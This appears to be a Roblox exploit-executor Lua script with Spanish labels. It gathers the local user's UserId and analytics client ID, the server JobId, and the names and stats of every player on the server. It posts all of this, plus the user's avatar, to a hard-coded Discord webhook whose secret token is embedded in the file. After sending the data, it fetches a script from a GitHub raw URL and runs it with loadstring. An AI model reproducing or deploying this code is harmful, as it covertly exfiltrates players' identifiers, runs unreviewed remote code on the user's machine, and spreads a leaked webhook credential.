local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local discordWebhookUrl = "https://discord.com/api/webhooks/1297123162453966848/5JIbEOpkRk_Q4gqoZpCCAYXVGSt9-J0yYmw5aIkryWrGk79ALskEmCHcV0FuZAPv4-4B"

local function getJobIdAndHwid()
    local jobId = game.JobId
    local hwid = game.Players.LocalPlayer.UserId
    return jobId, hwid
end

local function formatNumber(number)
    if number < 1000 then
        return tostring(number)
    end
    local suffixes = {"", "K", "M", "B", "T", "QD"}
    local suffix_index = 1
    while math.abs(number) >= 1000 and suffix_index < #suffixes do
        number = number / 1000.0
        suffix_index = suffix_index + 1
    end
    return string.format("%.2f%s", number, suffixes[suffix_index])
end

local function getAllPlayerData()
    local playerDataList = {}
    for _, player in pairs(Players:GetPlayers()) do
        local playerData = {}
        local playerName = player.Name
        local playerDisplayName = player.DisplayName

        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
        if folderData then
            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
            local formattedRebirth = formatNumber(rebirthValue)
            local formattedStrength = formatNumber(strengthValue)

            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s",
                playerName, playerDisplayName, formattedRebirth, formattedStrength)

            table.insert(playerDataList, {
                label = combinedLabel,
                rebirth = rebirthValue,
                strength = strengthValue
            })
        end
    end

    table.sort(playerDataList, function(a, b)
        if a.strength ~= b.strength then
            return a.strength > b.strength
        elseif a.rebirth ~= b.rebirth then
            return a.rebirth > b.rebirth
        end
        return false
    end)

    local sortedLabels = {}
    for _, data in ipairs(playerDataList) do
        table.insert(sortedLabels, data.label)
    end
    return playerDataList, sortedLabels
end

local function getClientId()
    local clientId = RbxAnalyticsService:GetClientId()
    return clientId
end

local function getServerInfo()
    local serverInfo = {}
    local worldNames = {
        [3311165597] = "Tierra",
        [5151400895] = "Bilss",
        [3608495586] = "HBTC TIEP",
        [3608496430] = "HBTC GAV"
    }

    local totalServers = 0
    local totalPlayers = 0
    local serversInfo = {}

    for placeId, worldName in pairs(worldNames) do
        local serverListUrl = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
        local success, response = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(serverListUrl))
        end)

        if success and response and response.data then
            local servers = #response.data
            local players = 0

            for _, server in ipairs(response.data) do
                players = players + server.playing
            end

            totalServers = totalServers + servers
            totalPlayers = totalPlayers + players

            table.insert(serversInfo, {
                worldName = worldName,
                servers = servers,
                players = players
            })
        end
    end

    return totalServers, totalPlayers, serversInfo
end

local function getAvatarUrl(userId)
    local url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png"
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    
    if success then
        local data = HttpService:JSONDecode(response)
        if data.data and #data.data > 0 then
            return data.data[1].imageUrl
        end
    end
    return nil
end

local function sendAvatarToDiscord(player)
    local userId = player.UserId
    local avatarUrl = getAvatarUrl(userId)

    if avatarUrl then
        local dataToSend = {
            ["embeds"] = {
                {
                    ["title"] = "Avatar del jugador",
                    ["color"] = 0x00ff00,
                    ["description"] = "Avatar de un jugador ejecutando el script.",
                    ["footer"] = {
                        ["text"] = "Miniatura del avatar"
                    },
                    ["thumbnail"] = {
                        ["url"] = avatarUrl
                    }
                }
            }
        }

        local success, response = pcall(function()
            return http_request({
                Url = discordWebhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(dataToSend)
            })
        end)

        if not success then
            warn("Error al enviar el avatar a Discord:", response)
        end
    else
        warn("No se pudo obtener la URL del avatar.")
    end
end

local function sendPlayerInfoToDiscord()
    local jobId, hwid = getJobIdAndHwid()
    local allPlayerData, sortedLabels = getAllPlayerData()
    local clientId = getClientId()
    local totalServers, totalPlayers, serversInfo = getServerInfo()

    local strongestPlayer = allPlayerData[1]

    local dataToSend = {
        ["embeds"] = {
            {
                ["description"] = "Jugadores del juego:\n\n" .. table.concat(sortedLabels, "\n\n"),
                ["color"] = 0x00ff00,
                ["title"] = "Estadísticas de los jugadores",
                ["fields"] = {
                    {
                        ["name"] = "JobId",
                        ["value"] = jobId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "HWID",
                        ["value"] = hwid,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ClientId",
                        ["value"] = clientId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Número Total de Servidores",
                        ["value"] = formatNumber(totalServers),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Número Total de Jugadores en Servidores",
                        ["value"] = formatNumber(totalPlayers),
                        ["inline"] = true
                    }
                }
            }
        }
    }

    local serverDetails = "Detalles de los servidores:\n"
    for _, info in ipairs(serversInfo) do
        serverDetails = serverDetails .. string.format("Mundo: %s\nServidores: %d\nJugadores: %d\n\n", info.worldName, info.servers, info.players)
    end

    table.insert(dataToSend["embeds"], {
        ["description"] = serverDetails,
        ["color"] = 0x00ff00,
        ["title"] = "Información de Servidores"
    })

    table.insert(dataToSend["embeds"], {
        ["description"] = strongestPlayer.label,
        ["color"] = 0x00ff00,
        ["title"] = "Jugador más fuerte"
    })

    local success, response = pcall(function()
        return http_request({
            Url = discordWebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(dataToSend)
        })
    end)

    if not success then
        warn("Error al enviar la información a Discord:", response)
    end

    -- Ejecutar el script adicional justo después de enviar los datos
    local additionalScriptUrl = "https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/DATOS_MAESTRIA.lua"
    local success, result = pcall(function()
        return loadstring(game:HttpGet(additionalScriptUrl))() -- Ejecuta el script adicional
    end)

    if not success then
        warn("Error al ejecutar el script adicional:", result)
    end
end

sendAvatarToDiscord(Players.LocalPlayer)

sendPlayerInfoToDiscord()
